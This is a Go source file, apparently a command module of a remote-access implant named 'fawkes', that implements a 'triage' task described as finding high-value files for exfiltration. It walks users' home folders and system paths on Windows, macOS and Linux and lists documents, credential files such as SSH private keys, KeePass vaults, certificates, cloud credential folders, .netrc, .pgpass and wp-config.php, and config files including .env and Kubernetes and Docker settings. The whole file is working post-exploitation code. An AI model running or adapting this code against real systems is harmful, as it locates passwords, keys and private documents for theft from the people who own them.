package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"fawkes/pkg/structs"
)

// TriageCommand scans for high-value files across common locations.
type TriageCommand struct{}

func (c *TriageCommand) Name() string        { return "triage" }
func (c *TriageCommand) Description() string { return "Find high-value files for exfiltration" }

type triageArgs struct {
	Action   string `json:"action"`
	MaxSize  int64  `json:"max_size"`
	MaxFiles int    `json:"max_files"`
	Path     string `json:"path"`
}

type triageResult struct {
	Path     string `json:"path"`
	Size     int64  `json:"size"`
	ModTime  string `json:"modified"`
	Category string `json:"category"`
}

func (c *TriageCommand) Execute(task structs.Task) structs.CommandResult {
	var args triageArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to parse arguments: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if args.Action == "" {
		args.Action = "all"
	}
	if args.MaxSize == 0 {
		args.MaxSize = 10 * 1024 * 1024 // 10MB default
	}
	if args.MaxFiles == 0 {
		args.MaxFiles = 200
	}

	var results []triageResult

	switch args.Action {
	case "all":
		results = triageAll(task, args)
	case "documents":
		results = triageDocuments(task, args)
	case "credentials":
		results = triageCredentials(task, args)
	case "configs":
		results = triageConfigs(task, args)
	case "custom":
		if args.Path == "" {
			return structs.CommandResult{
				Output:    "Error: -path required for custom triage",
				Status:    "error",
				Completed: true,
			}
		}
		results = triageCustom(task, args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s. Use: all, documents, credentials, configs, custom", args.Action),
			Status:    "error",
			Completed: true,
		}
	}

	if task.DidStop() {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Triage cancelled. Found %d files before stop.", len(results)),
			Status:    "success",
			Completed: true,
		}
	}

	if len(results) == 0 {
		return structs.CommandResult{
			Output:    "[]",
			Status:    "success",
			Completed: true,
		}
	}

	data, err := json.Marshal(results)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error marshaling output: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    string(data),
		Status:    "success",
		Completed: true,
	}
}

func triageAll(task structs.Task, args triageArgs) []triageResult {
	var results []triageResult
	results = append(results, triageDocuments(task, args)...)
	if task.DidStop() || len(results) >= args.MaxFiles {
		return results
	}
	results = append(results, triageCredentials(task, args)...)
	if task.DidStop() || len(results) >= args.MaxFiles {
		return results
	}
	results = append(results, triageConfigs(task, args)...)
	return results
}

func triageDocuments(task structs.Task, args triageArgs) []triageResult {
	extensions := []string{
		".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf",
		".odt", ".ods", ".odp", ".rtf", ".csv",
		".txt", ".md", ".log",
	}

	var searchPaths []string
	home, _ := os.UserHomeDir()

	switch runtime.GOOS {
	case "windows":
		searchPaths = []string{
			filepath.Join(home, "Documents"),
			filepath.Join(home, "Desktop"),
			filepath.Join(home, "Downloads"),
			filepath.Join(home, "OneDrive"),
		}
	case "darwin":
		searchPaths = []string{
			filepath.Join(home, "Documents"),
			filepath.Join(home, "Desktop"),
			filepath.Join(home, "Downloads"),
		}
	default:
		searchPaths = []string{
			filepath.Join(home, "Documents"),
			filepath.Join(home, "Desktop"),
			filepath.Join(home, "Downloads"),
			home,
		}
	}

	return triageScan(task, searchPaths, extensions, "doc", args, 3)
}

func triageCredentials(task structs.Task, args triageArgs) []triageResult {
	// Credential file patterns
	patterns := []string{
		"*.kdbx", "*.kdb", "*.key", "*.pem", "*.pfx", "*.p12",
		"*.ppk", "*.rdp", "id_rsa", "id_ed25519", "id_ecdsa",
		"*.ovpn", "*.conf", ".netrc", ".pgpass",
		"credentials", "credentials.json", "credentials.xml",
		"web.config", "wp-config.php",
		"*.jks", "*.keystore",
	}

	var searchPaths []string
	home, _ := os.UserHomeDir()

	switch runtime.GOOS {
	case "windows":
		searchPaths = []string{
			home,
			filepath.Join(home, ".ssh"),
			filepath.Join(home, ".aws"),
			filepath.Join(home, ".azure"),
			filepath.Join(home, ".gcloud"),
			filepath.Join(home, "AppData", "Roaming"),
			`C:\inetpub`,
			`C:\xampp`,
		}
	case "darwin":
		searchPaths = []string{
			filepath.Join(home, ".ssh"),
			filepath.Join(home, ".aws"),
			filepath.Join(home, ".azure"),
			filepath.Join(home, ".gcloud"),
			filepath.Join(home, ".gnupg"),
			filepath.Join(home, ".config"),
			"/etc",
		}
	default:
		searchPaths = []string{
			filepath.Join(home, ".ssh"),
			filepath.Join(home, ".aws"),
			filepath.Join(home, ".azure"),
			filepath.Join(home, ".gcloud"),
			filepath.Join(home, ".gnupg"),
			filepath.Join(home, ".config"),
			"/etc",
			"/opt",
			"/var/www",
		}
	}

	return triageScanPatterns(task, searchPaths, patterns, "cred", args, 3)
}

func triageConfigs(task structs.Task, args triageArgs) []triageResult {
	extensions := []string{
		".conf", ".cfg", ".ini", ".yaml", ".yml", ".json",
		".xml", ".properties", ".env", ".toml",
	}

	var searchPaths []string
	home, _ := os.UserHomeDir()

	switch runtime.GOOS {
	case "windows":
		searchPaths = []string{
			filepath.Join(home, ".aws"),
			filepath.Join(home, ".azure"),
			filepath.Join(home, ".kube"),
			`C:\ProgramData`,
		}
	default:
		searchPaths = []string{
			"/etc",
			filepath.Join(home, ".config"),
			filepath.Join(home, ".kube"),
			filepath.Join(home, ".docker"),
		}
	}

	return triageScan(task, searchPaths, extensions, "config", args, 2)
}

func triageCustom(task structs.Task, args triageArgs) []triageResult {
	// Scan all files under the custom path
	var results []triageResult
	filepath.Walk(args.Path, func(path string, info os.FileInfo, err error) error {
		if task.DidStop() || len(results) >= args.MaxFiles {
			return fmt.Errorf("limit")
		}
		if err != nil || info.IsDir() {
			return nil
		}
		if info.Size() > args.MaxSize || info.Size() == 0 {
			return nil
		}
		results = append(results, triageResult{
			Path:     path,
			Size:     info.Size(),
			ModTime:  info.ModTime().Format("2006-01-02 15:04"),
			Category: "custom",
		})
		return nil
	})
	return results
}

// triageScan scans paths for files matching extensions.
func triageScan(task structs.Task, paths []string, extensions []string, category string, args triageArgs, maxDepth int) []triageResult {
	extMap := make(map[string]bool)
	for _, ext := range extensions {
		extMap[strings.ToLower(ext)] = true
	}

	var results []triageResult
	for _, basePath := range paths {
		if task.DidStop() || len(results) >= args.MaxFiles {
			break
		}
		baseDepth := strings.Count(basePath, string(os.PathSeparator))
		filepath.Walk(basePath, func(path string, info os.FileInfo, err error) error {
			if task.DidStop() || len(results) >= args.MaxFiles {
				return fmt.Errorf("limit")
			}
			if err != nil {
				return nil
			}
			depth := strings.Count(path, string(os.PathSeparator)) - baseDepth
			if depth > maxDepth && info.IsDir() {
				return filepath.SkipDir
			}
			if info.IsDir() {
				return nil
			}
			if info.Size() > args.MaxSize || info.Size() == 0 {
				return nil
			}
			ext := strings.ToLower(filepath.Ext(info.Name()))
			if extMap[ext] {
				results = append(results, triageResult{
					Path:     path,
					Size:     info.Size(),
					ModTime:  info.ModTime().Format("2006-01-02 15:04"),
					Category: category,
				})
			}
			return nil
		})
	}
	return results
}

// triageScanPatterns scans paths for files matching glob patterns.
func triageScanPatterns(task structs.Task, paths []string, patterns []string, category string, args triageArgs, maxDepth int) []triageResult {
	var results []triageResult
	for _, basePath := range paths {
		if task.DidStop() || len(results) >= args.MaxFiles {
			break
		}
		baseDepth := strings.Count(basePath, string(os.PathSeparator))
		filepath.Walk(basePath, func(path string, info os.FileInfo, err error) error {
			if task.DidStop() || len(results) >= args.MaxFiles {
				return fmt.Errorf("limit")
			}
			if err != nil {
				return nil
			}
			depth := strings.Count(path, string(os.PathSeparator)) - baseDepth
			if depth > maxDepth && info.IsDir() {
				return filepath.SkipDir
			}
			if info.IsDir() {
				return nil
			}
			if info.Size() > args.MaxSize || info.Size() == 0 {
				return nil
			}
			name := info.Name()
			for _, pattern := range patterns {
				if matched, _ := filepath.Match(pattern, name); matched {
					results = append(results, triageResult{
						Path:     path,
						Size:     info.Size(),
						ModTime:  info.ModTime().Format("2006-01-02 15:04"),
						Category: category,
					})
					break
				}
			}
			return nil
		})
	}
	return results
}
